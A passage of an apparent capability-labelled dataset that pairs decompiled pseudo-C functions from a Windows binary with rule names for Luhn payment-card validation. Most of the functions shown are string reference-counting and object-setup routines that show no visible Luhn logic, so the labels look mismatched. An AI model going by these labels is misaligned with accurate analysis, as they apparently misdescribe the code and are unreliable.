0xffffffff;\n    }\n    if (piVar9[2] < piVar9[3]) {\n        iVar4 = *piVar9[2];\n    }\n    else {\n        iVar4 = (**(*piVar9 + 0x48))(piVar9);\n    }\n    if (iVar4 == -1) {\n        piVar9 = NULL;\n    }\n    bVar14 = iVar4 == -1 && (bVar14 && bVar13);\n    if (piVar10 != NULL && bVar12) goto code_r0x000140060aa0;\ncode_r0x0001400609d2:\n    bVar6 = bVar12;\n    if (uVar7 < in_stack_00000040) goto code_r0x0001400609de;\ncode_r0x000140060ad0:\n    if ((uVar7 != 0 && in_stack_00000030 <= iVar8) && (iVar8 <= in_stack_00000038)) {\n        *in_stack_00000028 = iVar8;\n        goto code_r0x000140060b05;\n    }\ncode_r0x000140060afa:\n    *in_stack_00000050 = *in_stack_00000050 | 4;\ncode_r0x000140060b05:\n    *arg1 = piVar9;\n    arg1[1] = piVar2 & 0xffffffffffff0000 | uVar11 & 0xffff;\n    return;\n}\n",
        "token_count": 1133
    },
    "14006e44": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.14006e440(int64_t *arg1, uint64_t arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar uStack25;\n    \n    piVar1 = *0x140102a70;\n    iVar4 = *arg1;\n    uVar3 = *(iVar4 + -0x10);\n    if (arg2 <= uVar3) {\n        arg2 = uVar3;\n        if (**0x140102a70 == 0) {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n        }\n        else {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n            iVar4 = *arg1;\n        }\n    }\n    iVar5 = fcn.14006cbb0(iVar4 + -0x18, &uStack25, arg2 - *(iVar4 + -0x18));\n    iVar4 = *arg1;\n    if (*piVar1 == 0) {\n        iVar2 = *(iVar4 + -8);\n        *(iVar4 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar4 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.1400b64d0(iVar4 + -0x18);\n    }\n    *arg1 = iVar5;\n    return;\n}\n",
        "token_count": 361
    },
    "14007781": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140077810(int64_t *arg1, uint64_t arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar uStack25;\n    \n    piVar1 = *0x140102a70;\n    iVar4 = *arg1;\n    uVar3 = *(iVar4 + -0x10);\n    if (arg2 <= uVar3) {\n        arg2 = uVar3;\n        if (**0x140102a70 == 0) {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n        }\n        else {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n            iVar4 = *arg1;\n        }\n    }\n    iVar5 = fcn.1400760a0(iVar4 + -0x18, &uStack25, arg2 - *(iVar4 + -0x18));\n    iVar4 = *arg1;\n    if (*piVar1 == 0) {\n        iVar2 = *(iVar4 + -8);\n        *(iVar4 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar4 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.1400b64d0(iVar4 + -0x18);\n    }\n    *arg1 = iVar5;\n    return;\n}\n",
        "token_count": 360
    },
    "14007ae9": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.14007ae90(ulong *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uchar uStack9;\n    \n    *arg1 = 0x14010a810;\n    iVar3 = arg1[1];\n    if (**0x140102a70 == 0) {\n        iVar2 = *(iVar3 + -8);\n        *(iVar3 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar3 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.140075f90(iVar3 + -0x18, &uStack9);\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "14008ffc": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.14008ffc0(ulong *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uchar uStack9;\n    \n    *arg1 = 0x14010ad10;\n    iVar3 = arg1[1];\n    if (**0x140102a70 == 0) {\n        iVar2 = *(iVar3 + -8);\n        *(iVar3 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar3 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.140075f90(iVar3 + -0x18, &uStack9);\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "14008123": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140081230(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int32_t *piVar3;\n    ulong in_stack_00000028;\n    uchar uStack17;\n    int64_t iStack16;\n    \n    (**(*arg2 + 0x18))(&iStack16, arg2, arg4, in_stack_00000028);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    piVar3 = *0x140102a70;\n    if (*(iStack16 + -8) < 0) {\n        iVar2 = fcn.1400760a0(iStack16 + -0x18, &uStack17, 0);\n        piVar3 = *0x140102a70;\n    }\n    else {\n        iVar2 = iStack16;\n        if (**0x140102a70 == 0) {\n            *(iStack16 + -8) = *(iStack16 + -8) + 1;\n        }\n        else {\n            LOCK();\n            *(iStack16 + -8) = *(iStack16 + -8) + 1;\n        }\n    }\n    *arg3 = iVar2;\n    arg3[1] = *(iStack16 + -0x18);\n    arg3[4] = 0x140080850;\n    if (*piVar3 == 0) {\n        iVar1 = *(iStack16 + -8);\n        *(iStack16 + -8) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = iStack16 + -8;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (0 < iVar1) {\n        return;\n    }\n    fcn.140075f90(iStack16 + -0x18, &uStack17);\n    return;\n}\n",
        "token_count": 450
    },
    "1400813c": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.1400813c0(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int32_t *piVar3;\n    ulong in_stack_00000028;\n    uchar uStack17;\n    int64_t iStack16;\n    \n    (**(*arg2 + 0x18))(&iStack16, arg2, arg4, in_stack_00000028);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    piVar3 = *0x140102a70;\n    if (*(iStack16 + -8) < 0) {\n        iVar2 = fcn.14006cbb0(iStack16 + -0x18, &uStack17, 0);\n        piVar3 = *0x140102a70;\n    }\n    else {\n        iVar2 = iStack16;\n        if (**0x140102a70 == 0) {\n            *(iStack16 + -8) = *(iStack16 + -8) + 1;\n        }\n        else {\n            LOCK();\n            *(iStack16 + -8) = *(iStack16 + -8) + 1;\n        }\n    }\n    *arg3 = iVar2;\n    arg3[1] = *(iStack16 + -0x18);\n    arg3[4] = 0x1400808d0;\n    if (*piVar3 == 0) {\n        iVar1 = *(iStack16 + -8);\n        *(iStack16 + -8) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = iStack16 + -8;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (0 < iVar1) {\n        return;\n    }\n    fcn.14006ca90(iStack16 + -0x18, &uStack17);\n    return;\n}\n",
        "token_count": 454
    },
    "14008193": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140081930(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    uint64_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uchar uVar6;\n    ushort uVar7;\n    uint uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    ulong uVar11;\n    int64_t *piVar12;\n    uchar uStack289;\n    int64_t iStack288;\n    int64_t iStack272;\n    int64_t *piStack264;\n    uchar *puStack256;\n    int64_t iStack248;\n    uchar *puStack240;\n    uint64_t uStack232;\n    uchar *puStack192;\n    int64_t iStack184;\n    uchar auStack176 [16];\n    ulong uStack160;\n    int64_t *piStack152;\n    uchar *puStack144;\n    int64_t iStack136;\n    int32_t *piStack128;\n    uint64_t uStack120;\n    int64_t iStack112;\n    uchar auStack65 [9];\n    \n    puStack144 = &stack0xffffffffffffffc0;\n    iStack112 = 0x140081952;\n    uVar7 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x48) = uVar7;\n    iStack112 = 0x14008195f;\n    uVar7 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 200) = 1;\n    *(arg3 + 0x4a) = uVar7;\n    iVar5 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    iStack112 = 0x14008198e;\n    (**(iVar5 + 0x20))(puStack144, arg2);\n    iVar5 = *(auStack65._1_8_ + -0x18);\n    iStack112 = 0x1400819a1;\n    iStack136 = fcn.1400b64f0(iVar5 + 1);\n    iStack112 = 0x1400819b5;\n    iStack272 = iVar5;\n    fcn.14001efe0(puStack144, iStack136, iVar5, 0);\n    *(iStack136 + iVar5) = 0;\n    *(arg3 + 0x18) = iVar5;\n    piStack128 = *0x140102a70;\n    *(arg3 + 0x10) = iStack136;\n    if (*piStack128 == 0) {\n        iVar4 = *(auStack65._1_8_ + -8);\n        *(auStack65._1_8_ + -8) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = auStack65._1_8_ + -8;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        iStack112 = 0x140081b10;\n        fcn.140075f90(auStack65._1_8_ + -0x18, &stack0xffffffffffffffbf);\n    }\n    iStack112 = 0x1400819f9;\n    (**(*arg2 + 0x28))(puStack144, arg2);\n    iVar5 = *(auStack65._1_8_ + -0x18);\n    uStack120 = iVar5 + 1;\n    if (0x3ffffffffffffffc < uStack120) {\n        iStack112 = 0x140081b97;\n        uStack160 = fcn.1400b7660();\n        piStack264 = &stack0xffffffffffffffbf;\n        iStack112 = 0x140081bad;\n        fcn.140075fa0(auStack65._1_8_ + -0x18);\n        iStack112 = 0x140081bb5;\n        fcn.14000f000(uStack160);\n        puStack256 = &stack0xffffffffffffff40;\n        uStack232 = 0x140081be2;\n        piStack152 = arg2;\n        iStack112 = iVar5;\n        uVar7 = (**(*piStack264 + 0x10))(piStack264);\n        *(iStack272 + 0x48) = uVar7;\n        uStack232 = 0x140081bef;\n        uVar7 = (**(*piStack264 + 0x18))(piStack264);\n        *(iStack272 + 200) = 1;\n        *(iStack272 + 0x4a) = uVar7;\n        iVar5 = *piStack264;\n        *(iStack272 + 0x10) = 0;\n        *(iStack272 + 0x28) = 0;\n        *(iStack272 + 0x38) = 0;\n        uStack232 = 0x140081c1e;\n        (**(iVar5 + 0x20))(puStack256, piStack264);\n        iVar5 = iStack184;\n        uStack232 = 0x140081c2d;\n        iStack248 = fcn.1400b64f0(iStack184 + 1);\n        uStack232 = 0x140081c41;\n        iVar9 = iVar5;\n        fcn.140029990(puStack256, iStack248, iVar5, 0);\n        *(iStack248 + iVar5) = 0;\n        *(iStack272 + 0x18) = iVar5;\n        puStack240 = &stack0xffffffffffffff50;\n        *(iStack272 + 0x10) = iStack248;\n        if (puStack192 != puStack240) {\n            uStack232 = 0x140081c63;\n            fcn.1400b64d0();\n        }\n        uStack232 = 0x140081c6f;\n        piVar12 = piStack264;\n        (**(*piStack264 + 0x28))(puStack256);\n        iVar5 = iStack184;\n        uVar2 = iStack184 + 1;\n        if (uVar2 < 0x3ffffffffffffffd) {\n            uStack232 = 0x140081c96;\n            iVar9 = fcn.1400b64f0(uVar2 * 2);\n            uStack232 = 0x140081caa;\n            fcn.14002a720(puStack256, iVar9, iVar5, 0);\n            *(iStack272 + 0x28) = iVar9;\n            *(iVar9 + -2 + uVar2 * 2) = 0;\n            *(iStack272 + 0x30) = iVar5;\n            if (puStack192 != puStack240) {\n                uStack232 = 0x140081cc9;\n                fcn.1400b64d0();\n            }\n            uStack232 = 0x140081cd5;\n            (**(*piStack264 + 0x30))(puStack256, piStack264);\n            if (iStack184 + 1U < 0x3ffffffffffffffd) {\n                iVar5 = (iStack184 + 1U) * 2;\n                uStack232 = 0x140081cf8;\n                iVar9 = fcn.1400b64f0(iVar5);\n                uStack232 = 0x140081d0c;\n                fcn.14002a720(puStack256, iVar9, iStack184, 0);\n                *(iStack272 + 0x38) = iVar9;\n                *(iVar9 + -2 + iVar5) = 0;\n                *(iStack272 + 0x40) = iStack184;\n                if (puStack192 != puStack240) {\n                    uStack232 = 0x140081d2a;\n                    fcn.1400b64d0();\n                }\n                return;\n            }\n            uStack232 = 0x140081d6d;\n            uVar11 = fcn.1400b7660();\n            do {\n                if (puStack192 != puStack240) {\n                    uStack232 = 0x140081d51;\n                    fcn.1400b64d0();\n                }\n                uStack232 = 0x140081d59;\n                uVar11 = fcn.14000f000(uVar11);\n            } while( true );\n        }\n        uStack232 = 0x140081d74;\n        fcn.1400b7660();\n        uStack232 = uVar2;\n        uVar6 = (**(*piVar12 + 0x10))(piVar12);\n        *(iVar9 + 0x21) = uVar6;\n        uVar6 = (**(*piVar12 + 0x18))(piVar12);\n        *(iVar9 + 0x22) = uVar6;\n        uVar8 = (**(*piVar12 + 0x40))(piVar12);\n        *(iVar9 + 0x6f) = 1;\n        *(iVar9 + 0x58) = uVar8;\n        iVar5 = *piVar12;\n        *(iVar9 + 0x10) = 0;\n        *(iVar9 + 0x28) = 0;\n        *(iVar9 + 0x38) = 0;\n        *(iVar9 + 0x48) = 0;\n        (**(iVar5 + 0x20))(&stack0xfffffffffffffee0, piVar12);\n        iVar5 = *(iStack288 + -0x18);\n        iVar10 = fcn.1400b64f0(iVar5 + 1);\n        fcn.14001efe0(&stack0xfffffffffffffee0, iVar10, iVar5, 0);\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x18) = iVar5;\n        piVar1 = *0x140102a70;\n        *(iVar9 + 0x10) = iVar10;\n        if (*piVar1 == 0) {\n            iVar4 = *(iStack288 + -8);\n            *(iStack288 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = iStack288 + -8;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.140075f90(iStack288 + -0x18, &stack0xfffffffffffffedf);\n        }\n        (**(*piVar12 + 0x28))(&stack0xfffffffffffffee0, piVar12);\n        iVar5 = *(iStack288 + -0x18);\n        iVar10 = fcn.1400b64f0(iVar5 + 1);\n        fcn.14001efe0(&stack0xfffffffffffffee0, iVar10, iVar5, 0);\n        iVar4 = *piVar1;\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x28) = iVar10;\n        *(iVar9 + 0x30) = iVar5;\n        if (iVar4 == 0) {\n            iVar4 = *(iStack288 + -8);\n            *(iStack288 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = iStack288 + -8;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.140075f90(iStack288 + -0x18, &stack0xfffffffffffffedf);\n        }\n        (**(*piVar12 + 0x30))(&stack0xfffffffffffffee0, piVar12);\n        iVar5 = *(iStack288 + -0x18);\n        iVar10 = fcn.1400b64f0(iVar5 + 1);\n        fcn.14001efe0(&stack0xfffffffffffffee0, iVar10, iVar5, 0);\n        iVar4 = *piVar1;\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x38) = iVar10;\n        *(iVar9 + 0x40) = iVar5;\n        if (iVar4 == 0) {\n            iVar4 = *(iStack288 + -8);\n            *(iStack288 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = iStack288 + -8;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.140075f90(iStack288 + -0x18, &stack0xfffffffffffffedf);\n        }\n        (**(*piVar12 + 0x38))(&stack0xfffffffffffffee0, piVar12);\n        iVar5 = *(iStack288 + -0x18);\n        iVar10 = fcn.1400b64f0(iVar5 + 1);\n        fcn.14001efe0(&stack0xfffffffffffffee0, iVar10, iVar5, 0);\n        iVar4 = *piVar1;\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x48) = iVar10;\n        *(iVar9 + 0x50) = iVar5;\n        if (iVar4 == 0) {\n            iVar4 = *(iStack288 + -8);\n            *(iStack288 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack288 + -8;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.140075f90(iStack288 + -0x18, &stack0xfffffffffffffedf);\n        }\n        uVar8 = (**(*piVar12 + 0x48))(piVar12);\n        *(iVar9 + 0x5c) = uVar8;\n        uVar8 = (**(*piVar12 + 0x50))(piVar12);\n        *(iVar9 + 0x60) = uVar8;\n        return;\n    }\n    iStack112 = 0x140081a24;\n    iVar9 = fcn.1400b64f0(uStack120 * 2);\n    iStack112 = 0x140081a38;\n    fcn.14001df50(puStack144, iVar9, iVar5, 0);\n    iVar4 = *piStack128;\n    *(arg3 + 0x28) = iVar9;\n    *(iVar9 + -2 + uStack120 * 2) = 0;\n    *(arg3 + 0x30) = iVar5;\n    if (iVar4 == 0) {\n        iVar4 = *(auStack65._1_8_ + -8);\n        *(auStack65._1_8_ + -8) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = auStack65._1_8_ + -8;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        iStack112 = 0x140081b68;\n        fcn.14006ca90(auStack65._1_8_ + -0x18, &stack0xffffffffffffffbf);\n    }\n    iStack112 = 0x140081a77;\n    (**(*arg2 + 0x30))(puStack144, arg2);\n    iVar5 = *(auStack65._1_8_ + -0x18);\n    if (0x3ffffffffffffffc < iVar5 + 1U) {\n        iStack112 = 0x140081b72;\n        uVar11 = fcn.1400b7660();\n        do {\n            iStack112 = 0x140081b88;\n            fcn.14006caa0(auStack65._1_8_ + -0x18);\n            iStack112 = 0x140081b90;\n            uVar11 = fcn.14000f000(uVar11);\n        } while( true );\n    }\n    iVar9 = (iVar5 + 1U) * 2;\n    iStack112 = 0x140081aa2;\n    iVar10 = fcn.1400b64f0(iVar9);\n    iStack112 = 0x140081ab6;\n    fcn.14001df50(puStack144, iVar10, iVar5, 0);\n    iVar4 = *piStack128;\n    *(arg3 + 0x38) = iVar10;\n    *(iVar10 + -2 + iVar9) = 0;\n    *(arg3 + 0x40) = iVar5;\n    if (iVar4 == 0) {\n        iVar4 = *(auStack65._1_8_ + -8);\n        *(auStack65._1_8_ + -8) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = auStack65._1_8_ + -8;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        iStack112 = 0x140081b34;\n        fcn.14006ca90(auStack65._1_8_ + -0x18, &stack0xffffffffffffffbf);\n        return;\n    }\n    return;\n}\n",
        "token_count": 3959
    },
    "14008272": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140082720(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ushort uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    int64_t iVar9;\n    ulong *arg1;\n    int64_t *piVar10;\n    uchar *puStack416;\n    int64_t iStack408;\n    uchar auStack400 [24];\n    int64_t *piStack376;\n    uchar *puStack368;\n    int64_t iStack360;\n    uint64_t uStack352;\n    int32_t *piStack344;\n    int64_t iStack336;\n    uchar uStack289;\n    int64_t iStack288;\n    int64_t iStack280;\n    int64_t *piStack272;\n    uchar *puStack264;\n    int64_t iStack256;\n    uint64_t uStack248;\n    uchar *puStack240;\n    int64_t iStack232;\n    uchar *puStack192;\n    int64_t iStack184;\n    uchar auStack176 [16];\n    int64_t iStack160;\n    int64_t *piStack152;\n    uchar *puStack144;\n    int64_t iStack136;\n    uint64_t uStack128;\n    int32_t *piStack120;\n    int64_t iStack112;\n    uchar uStack65;\n    int64_t iStack64;\n    \n    puStack144 = &stack0xffffffffffffffc0;\n    iStack112 = 0x140082742;\n    uVar4 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x22) = uVar4;\n    iStack112 = 0x14008274f;\n    uVar4 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x24) = uVar4;\n    iStack112 = 0x14008275c;\n    uVar5 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x7a) = 1;\n    *(arg3 + 0x58) = uVar5;\n    iVar3 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    iStack112 = 0x14008278f;\n    (**(iVar3 + 0x20))(puStack144, arg2);\n    iVar3 = *(iStack64 + -0x18);\n    iStack112 = 0x1400827a2;\n    iStack136 = fcn.1400b64f0(iVar3 + 1);\n    iStack112 = 0x1400827b6;\n    iStack280 = iVar3;\n    fcn.14001efe0(puStack144, iStack136, iVar3, 0);\n    piStack120 = *0x140102a70;\n    *(iStack136 + iVar3) = 0;\n    *(arg3 + 0x10) = iStack136;\n    iVar2 = *piStack120;\n    *(arg3 + 0x18) = iVar3;\n    if (iVar2 == 0) {\n        iVar2 = *(iStack64 + -8);\n        *(iStack64 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack64 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        iStack112 = 0x1400829b0;\n        fcn.140075f90(iStack64 + -0x18, &stack0xffffffffffffffbf);\n    }\n    iStack112 = 0x1400827fa;\n    piStack272 = arg2;\n    (**(*arg2 + 0x28))(puStack144);\n    iVar3 = *(iStack64 + -0x18);\n    uStack128 = iVar3 + 1;\n    if (uStack128 < 0x3ffffffffffffffd) {\n        iStack112 = 0x140082825;\n        iVar6 = fcn.1400b64f0(uStack128 * 2);\n        iStack112 = 0x140082839;\n        fcn.14001df50(puStack144, iVar6, iVar3, 0);\n        iVar2 = *piStack120;\n        *(arg3 + 0x28) = iVar6;\n        *(iVar6 + -2 + uStack128 * 2) = 0;\n        *(arg3 + 0x30) = iVar3;\n        if (iVar2 == 0) {\n            iVar2 = *(iStack64 + -8);\n            *(iStack64 + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack64 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            iStack112 = 0x140082a28;\n            fcn.14006ca90(iStack64 + -0x18, &stack0xffffffffffffffbf);\n        }\n        iStack112 = 0x140082879;\n        (**(*arg2 + 0x30))(puStack144, arg2);\n        iVar3 = *(iStack64 + -0x18);\n        if (iVar3 + 1U < 0x3ffffffffffffffd) {\n            iVar6 = (iVar3 + 1U) * 2;\n            iStack112 = 0x1400828a4;\n            iVar7 = fcn.1400b64f0(iVar6);\n            iStack112 = 0x1400828b8;\n            fcn.14001df50(puStack144, iVar7, iVar3, 0);\n            iVar2 = *piStack120;\n            *(arg3 + 0x38) = iVar7;\n            *(iVar7 + -2 + iVar6) = 0;\n            *(arg3 + 0x40) = iVar3;\n            if (iVar2 == 0) {\n                iVar2 = *(iStack64 + -8);\n                *(iStack64 + -8) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = iStack64 + -8;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                iStack112 = 0x140082a00;\n                fcn.14006ca90(iStack64 + -0x18, &stack0xffffffffffffffbf);\n            }\n            iStack112 = 0x1400828f7;\n            (**(*arg2 + 0x38))(puStack144, arg2);\n            iVar3 = *(iStack64 + -0x18);\n            if (iVar3 + 1U < 0x3ffffffffffffffd) {\n                iVar6 = (iVar3 + 1U) * 2;\n                iStack112 = 0x140082922;\n                iVar7 = fcn.1400b64f0(iVar6);\n                iStack112 = 0x140082936;\n                fcn.14001df50(puStack144, iVar7, iVar3, 0);\n                iVar2 = *piStack120;\n                *(arg3 + 0x48) = iVar7;\n                *(iVar7 + -2 + iVar6) = 0;\n                *(arg3 + 0x50) = iVar3;\n                if (iVar2 == 0) {\n                    iVar2 = *(iStack64 + -8);\n                    *(iStack64 + -8) = iVar2 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = iStack64 + -8;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar2 < 1) {\n                    iStack112 = 0x1400829d4;\n                    fcn.14006ca90(iStack64 + -0x18, &stack0xffffffffffffffbf);\n                }\n                iStack112 = 0x140082969;\n                uVar5 = (**(*arg2 + 0x48))(arg2);\n                *(arg3 + 0x5c) = uVar5;\n                iStack112 = 0x140082975;\n                uVar5 = (**(*arg2 + 0x50))(arg2);\n                *(arg3 + 0x60) = uVar5;\n                return;\n            }\n            iStack112 = 0x140082a75;\n            uVar8 = fcn.1400b7660();\n        }\n        else {\n            iStack112 = 0x140082a32;\n            uVar8 = fcn.1400b7660();\n        }\n        do {\n            iStack112 = 0x140082a48;\n            fcn.14006caa0(iStack64 + -0x18);\n            iStack112 = 0x140082a50;\n            uVar8 = fcn.14000f000(uVar8);\n        } while( true );\n    }\n    iStack112 = 0x140082a7c;\n    fcn.1400b7660();\n    puStack264 = &stack0xffffffffffffff40;\n    iStack232 = 0x140082aa2;\n    iStack160 = arg3;\n    piStack152 = arg2;\n    iStack112 = iVar3;\n    uVar4 = (**(*piStack272 + 0x10))(piStack272);\n    *(iStack280 + 0x22) = uVar4;\n    iStack232 = 0x140082aaf;\n    uVar4 = (**(*piStack272 + 0x18))(piStack272);\n    *(iStack280 + 0x24) = uVar4;\n    iStack232 = 0x140082abc;\n    uVar5 = (**(*piStack272 + 0x40))(piStack272);\n    *(iStack280 + 0x7a) = 1;\n    *(iStack280 + 0x58) = uVar5;\n    iVar3 = *piStack272;\n    *(iStack280 + 0x10) = 0;\n    *(iStack280 + 0x28) = 0;\n    *(iStack280 + 0x38) = 0;\n    *(iStack280 + 0x48) = 0;\n    iStack232 = 0x140082aef;\n    (**(iVar3 + 0x20))(puStack264, piStack272);\n    iVar3 = iStack184;\n    iStack232 = 0x140082afe;\n    iStack256 = fcn.1400b64f0(iStack184 + 1);\n    iStack232 = 0x140082b12;\n    iVar6 = iVar3;\n    fcn.140029990(puStack264, iStack256, iVar3, 0);\n    puStack240 = &stack0xffffffffffffff50;\n    *(iStack256 + iVar3) = 0;\n    *(iStack280 + 0x10) = iStack256;\n    *(iStack280 + 0x18) = iVar3;\n    if (puStack192 != puStack240) {\n        iStack232 = 0x140082b34;\n        fcn.1400b64d0();\n    }\n    iStack232 = 0x140082b40;\n    piStack376 = piStack272;\n    (**(*piStack272 + 0x28))(puStack264);\n    iVar3 = iStack184;\n    uStack248 = iStack184 + 1;\n    if (uStack248 < 0x3ffffffffffffffd) {\n        iStack232 = 0x140082b67;\n        iVar6 = fcn.1400b64f0(uStack248 * 2);\n        